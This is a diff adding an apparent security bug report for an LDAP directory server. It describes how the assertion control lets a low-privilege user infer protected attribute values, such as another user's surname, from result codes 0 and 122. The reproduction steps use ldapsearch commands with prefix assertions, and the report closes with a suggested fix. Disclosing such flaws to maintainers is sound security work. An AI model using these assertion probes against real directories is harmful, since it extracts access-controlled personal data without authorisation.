@@ -1,0 +1,48 @@
+Using the LDAP assertion control, it is possible to check if an entry contains attribute values matching the given assertion even if the entry and its attributes are protected by access controls. This is only possible with the assertion control. A normal search request without this control does not disclose that information.
+As it results in an unauthorized disclosure of the server's contents, I consider this a security issue.
+
+These issue can be reproduced with the following setup:
+
+./setup -i -n -d 10 -b "dc=example,dc=com" -w secret
+
+
+
+The following aci should deny access to the dc=example,dc=com subtree
+
+dn: dc=example,dc=com
+changetype: modify
+add: aci
+aci: (target ="ldap:///dc=example,dc=com")(version 3.0;acl "Deny anonymous access";
+ deny (all)(userdn = "ldap:///anyone");)
+
+
+
+The following examples describe the behavior for search operations. Of course, modify operations etc. are also affected by this issue.
+
+A normal ldapsearch does not disclose information
+
+ldapsearch -LLL -h localhost -p 1389 -x -b "uid=user.8,ou=people,dc=example,dc=com" \
+ -D "uid=user.1,ou=people,dc=example,dc=com" -w password  'objectclass=*'
+
+
+No output because user.1 cannot see user.8's entry.
+Nevertheless, result code 0 shows that the entry actually exists.
+
+Result code 122 indicates that the assertion does not match
+
+ldapsearch -LLL -h localhost -p 1389 -x -b "uid=user.8,ou=people,dc=example,dc=com" \
+ -D "uid=user.1,ou=people,dc=example,dc=com" -w password -e '!assert=sn=b*' 'objectclass=*'
+Assertion Failed (122)
+
+
+user.8 doesn't seem to have a surname beginning with 'b'
+
+Result code 0 indicates that the assertion does match
+
+ldapsearch -LLL -h localhost -p 1389 -x -b "uid=user.8,ou=people,dc=example,dc=com" \
+ -D "uid=user.1,ou=people,dc=example,dc=com" -w password -e '!assert=sn=a*' 'objectclass=*'
+
+
+No output; result code 0, so user.8's surname has to begin with an 'a'
+
+Suggestion: Consistently respond with the same result code (122 or 50 or 32 or ...) if the entry or attribute is not readable by the current user. This should prevent an unauthorized disclosure of protected data.
